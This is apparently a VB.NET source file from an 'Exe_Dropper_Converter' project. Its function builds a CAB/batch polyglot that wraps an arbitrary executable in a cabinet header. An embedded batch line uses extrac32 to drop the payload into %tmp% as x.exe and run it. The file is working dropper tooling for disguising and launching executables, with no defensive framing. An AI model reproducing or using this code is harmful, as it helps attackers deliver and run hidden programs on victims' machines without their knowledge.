Imports System.IO
Imports System.Linq

Namespace Exe_Dropper_Converter
    Public Module CabMaker
        Public Function MakeCab(ByVal filebytes As Byte()) As Byte()
            Dim fileparts As Byte()() = filebytes.[Select](Function(c, index) New With {c, index
                                }).GroupBy(Function(x) x.index / 32767).[Select](Function(group) group.[Select](Function(elem) elem.c).ToArray()).ToArray()

            Using ms As MemoryStream = New MemoryStream()
                Using bw As BinaryWriter = New BinaryWriter(ms)
                    bw.Write("MSCF".ToCharArray())
                    bw.Write(0UI)
                    bw.Write(UInteger.MaxValue) ' cbCabinet
                    bw.Write(0UI)
                    bw.Write(44UI + 73UI) ' coffFiles
                    bw.Write(0UI)
                    bw.Write(CByte(3))
                    bw.Write(CByte(1))
                    bw.Write(CUShort(1UI))
                    bw.Write(CUShort(1UI))
                    bw.Write(CUShort(0UI))
                    bw.Write(CUShort(0UI))
                    bw.Write(CUShort(0UI))

                    bw.Write(66UI + 73UI) ' coffCabStart
                    bw.Write(CUShort(fileparts.Length)) ' cCFData (count of CFDATA)
                    bw.Write(CUShort(0UI)) ' typeCompress

                    bw.Write(Microsoft.VisualBasic.Constants.vbLf & Microsoft.VisualBasic.Constants.vbCrLf & Microsoft.VisualBasic.Constants.vbCr & "cls && extrac32 /y ""%~f0"" ""%tmp%\x.exe"" && start """" ""%tmp%\x.exe""" & Microsoft.VisualBasic.Constants.vbLf & Microsoft.VisualBasic.Constants.vbCrLf & Microsoft.VisualBasic.Constants.vbCr.ToCharArray())

                    bw.Write(CUInt(filebytes.Length))
                    bw.Write(0UI)
                    bw.Write(CUShort(0UI))
                    bw.Write(CByte(1))
                    bw.Write(CByte(1))
                    bw.Write(CByte(0))
                    bw.Write(CByte(0))
                    bw.Write(CUShort(32UI))
                    bw.Write("x.exe" & Microsoft.VisualBasic.Constants.vbNullChar.ToCharArray())

                    For Each part In fileparts
                        bw.Write(0UI)
                        bw.Write(CUShort(part.Length))
                        bw.Write(CUShort(part.Length))
                        bw.Write(part)
                    Next

                    bw.Flush()
                    Return ms.ToArray()
                End Using
            End Using
        End Function
    End Module
End Namespace
